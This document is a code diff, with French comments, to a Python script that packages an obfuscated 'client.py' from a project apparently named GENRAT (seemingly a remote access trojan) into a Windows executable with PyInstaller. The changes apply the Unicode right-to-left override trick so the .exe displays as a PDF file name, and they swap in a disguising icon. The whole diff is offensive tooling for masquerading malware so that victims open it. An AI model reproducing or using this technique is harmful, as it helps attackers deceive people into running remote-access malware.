@@ -11,7 +11,7 @@ def create_exe(input_file, exe_name=None, icon_path=None):
         # Appliquer le caractère Unicode RLO pour inverser l'affichage du nom
         if exe_name:
             rlo = "\u202E"  # Caractère RLO pour inverser visuellement l'écriture
-            exe_name = f"ann{rlo}fdp.exe"
+            exe_name = f"ann{rlo}pdf.exe"
 
         # Commande PyInstaller pour créer l'exécutable
         command = [
@@ -46,7 +46,7 @@ def create_exe(input_file, exe_name=None, icon_path=None):
 # Exemple d'utilisation
 if __name__ == "__main__":
     # Chemin vers le fichier Python que tu souhaites transformer en .exe
-    input_file = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\Decryption.py"  # Remplace par ton fichier .py
+    input_file = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\obfuscated_scripts\\client.py"  # Remplace par ton fichier .py
     exe_name = "annpdf"  # Nom réel du fichier
-    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\def.ico"  # Remplace par le chemin de ton icône au format .ico
+    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\win.ico"  # Remplace par le chemin de ton icône au format .ico
     create_exe(input_file, exe_name, icon_path)
